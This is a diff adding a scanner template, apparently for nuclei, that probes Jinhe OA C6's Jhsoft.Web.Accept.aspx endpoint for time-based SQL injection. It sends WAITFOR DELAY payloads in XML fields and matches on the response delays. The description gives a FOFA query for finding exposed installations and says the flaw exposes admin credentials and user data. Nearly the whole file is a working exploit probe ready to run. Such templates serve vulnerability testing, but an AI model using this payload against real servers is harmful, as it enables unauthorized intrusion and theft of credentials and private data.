@@ -1,0 +1,47 @@
+id: jinhe-oa-jhsoftwebaccept-sqli
+info:
+  name: "金和 OA Jhsoft.Web.Accept.aspx SQL 注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="金和网络-金和OA"
+          金和网络作为专业信息化服务商，提供协同OA系统开发平台及电子政务解决方案。其OA C6版本Jhsoft.Web.Accept.aspx接口存在SQL注入漏洞。攻击者可通过SQL注入漏洞提取数据库敏感信息，包括但不限于管理员凭据及用户隐私数据，在具备高权限条件下可能实现服务器端恶意代码部署，进而控制系统权限。
+  tags: 金和OA
+http:
+- raw:
+  - |
+    POST /c6/Jhsoft.Web.Accept/XmlHttp.aspx/ HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/xml
+
+    <root>
+      <hid1>1)WAITFOR DELAY'0:0:3'-- </hid1>
+      <hid2>1)WAITFOR DELAY'0:0:3'-- </hid2>
+      <ajname></ajname>
+      <jgwtname></jgwtname>
+      <id></id>
+      <userid></userid>
+      <Flag>savesendperson</Flag>
+      <fieldcode></fieldcode>
+    </root>
+  - |
+    POST /c6/Jhsoft.Web.Accept/XmlHttp.aspx/ HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/xml
+
+    <root>
+      <hid1>1)WAITFOR DELAY'0:0:8'-- </hid1>
+      <hid2>1)WAITFOR DELAY'0:0:8'-- </hid2>
+      <ajname></ajname>
+      <jgwtname></jgwtname>
+      <id></id>
+      <userid></userid>
+      <Flag>savesendperson</Flag>
+      <fieldcode></fieldcode>
+    </root>
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=3 && duration_1<=4
+    - duration_2>=8 && duration_2<=9
+    condition: and
